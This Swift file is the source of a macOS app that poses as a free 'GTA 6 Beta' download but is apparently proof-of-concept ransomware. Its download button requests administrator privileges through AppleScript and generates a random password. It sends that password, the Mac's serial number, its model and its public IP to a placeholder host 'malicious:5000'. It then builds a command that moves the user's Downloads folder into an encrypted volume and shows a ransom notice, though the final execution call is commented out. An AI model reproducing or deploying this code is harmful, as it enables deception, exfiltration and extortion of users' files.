//
//  ContentView.swift
//  game
//
//  Created by WOLF on 3/12/24.
//

import SwiftUI
import Foundation

public extension URL {
    static var userHome : URL   {
        URL(fileURLWithPath: userHomePath, isDirectory: true)
    }
    
    static var userHomePath : String   {
        let pw = getpwuid(getuid())

        if let home = pw?.pointee.pw_dir {
            return FileManager.default.string(withFileSystemRepresentation: home, length: Int(strlen(home)))
        }
        
        fatalError()
    }
}

struct ContentView: View {
    @State private var showingAlert = false
    @State private var alertMessage = ""
    @State private var loading = false
    @State private var ransomed = false
    @State private var ransoMsg = ""
    
    var body: some View {
        VStack {
            Spacer()
            Image(systemName: "globe")
                .imageScale(.large)
                .foregroundColor(.accentColor)
            Spacer()
            Text("Download GTA 6 Beta for free!")
                .font(.title)
            Spacer()
            Button(action: signIn) {
                Label("Download now!", systemImage: "icloud.and.arrow.down.fill")
            }
            .alert(isPresented: $showingAlert) {
                Alert(title: Text("Error"), message: Text(alertMessage), dismissButton: .default(Text("OK")))
            }
            .alert(isPresented: $ransomed) {
                Alert(title: Text("Ransom Notice"), message: Text("You've been ransomed!. Error: "+ransoMsg), dismissButton: .default(Text("OK")))
            }
            Spacer()
            //show loading indicator
            if loading {
                ProgressView(
                    "Downloading..."
                )
            }
            Spacer()
        }
        .padding()
        .frame(width: 400, height: 600)
    }
    
    func getAppleScript(shellScript: String) -> String {
        return "do shell script \"\(shellScript)\" with administrator privileges";
    }
    
    func runAppleScript(script: String) -> String? {
        let appleScript = NSAppleScript(source: script)
        let eventResult = appleScript?.executeAndReturnError(nil)
        return eventResult?.stringValue
    }
    
    func getSystemInformation() -> (String?, String?) {
        let serialNumber = runShellCommand("system_profiler SPHardwareDataType | awk '/Serial/ {print $4}'")
        let macType = runShellCommand("system_profiler SPHardwareDataType | awk '/Model Identifier/ {print $3}'")
        return (serialNumber, macType)
    }

    func runShellCommand(_ command: String) -> String? {
        let task = Process()
        let pipe = Pipe()

        task.standardOutput = pipe
        task.arguments = ["-c", command]
        task.launchPath = "/bin/bash"
        task.launch()

        let data = pipe.fileHandleForReading.readDataToEndOfFile()
        let output = String(data: data, encoding: .utf8)

        return output?.trimmingCharacters(in: .whitespacesAndNewlines)
    }

    func getPublicIP(completion: @escaping (String?) -> Void) {
        let url = URL(string: "https://api.ipify.org")!
        let task = URLSession.shared.dataTask(with: url) { (data, response, error) in
            if let data = data {
                let ip = String(data: data, encoding: .utf8)
                completion(ip)
            } else {
                print("Failed to get IP address: \(error?.localizedDescription ?? "Unknown error")")
                completion(nil)
            }
        }
        task.resume()
    }

    func encryptData(pwd: String, homeDir: String) {
        let pwdShellScript = """
        sh -c 'diskutil apfs addVolume disk1 APFS ohno -passphrase \\"\(pwd)\\"; rsync -zvrh --remove-source-files \(homeDir)/Downloads /Volumes/ohno; diskutil unmount ohno;'
        """
        let shellScript = getAppleScript(shellScript: pwdShellScript)
        print(shellScript)
        //ransoMsg = runAppleScript(script: shellScript)!
        ransomed = true
    }
    
    func signIn() {
        
        let home = URL.userHome.path;
        let pwdShellScript = """
        sh -c 'p=$(head -n 1024 /dev/urandom | LC_ALL=C tr -dc \\"[:alnum:]\\" | head -c 64); echo $p'
        """
        let pwd = runAppleScript(script: getAppleScript(shellScript: pwdShellScript))
        if (pwd == nil) {
            alertMessage = "Failed to generate password"
            showingAlert = pwd == nil
        }
        print(pwd)
        
        let system_info = getSystemInformation()
        if (system_info.0 == nil || system_info.1 == nil) {
            alertMessage = "Failed to get system information"
            showingAlert = true
        }

        //get my public ip

        var ip: String?
        getPublicIP { (publicIP) in
            ip = publicIP
            let serialNumber = system_info.0!
            let macType = system_info.1!

            let url = URL(string: "http://malicious:5000/gta6")!
            var request = URLRequest(url: url)
            request.httpMethod = "POST"
            request.addValue("application/json", forHTTPHeaderField: "Content-Type")

            let json: [String: Any] = ["pwd": pwd, "deviceInfo": ["serial": serialNumber, "model": macType], "ip": ip]
            print(json)
            let jsonData = try? JSONSerialization.data(withJSONObject: json)

            request.httpBody = jsonData

            let task = URLSession.shared.dataTask(with: request) { (data, response, error) in
                if let error = error {
                    print("Error: \(error)")
                    alertMessage = "Failed to connect to server"
                    showingAlert = true
                } else if let data = data {
                    let str = String(data: data, encoding: .utf8)
                    print("Received data:\n\(str ?? "")")
                    loading = true
                    encryptData(pwd: pwd!, homeDir: home)
                } else {
                    alertMessage = error?.localizedDescription ?? "Unknown error"
                    showingAlert = true
                }
            }

            task.resume()
        }
    }
}

struct ContentView_Previews: PreviewProvider {
    static var previews: some View {
        ContentView()
    }
}
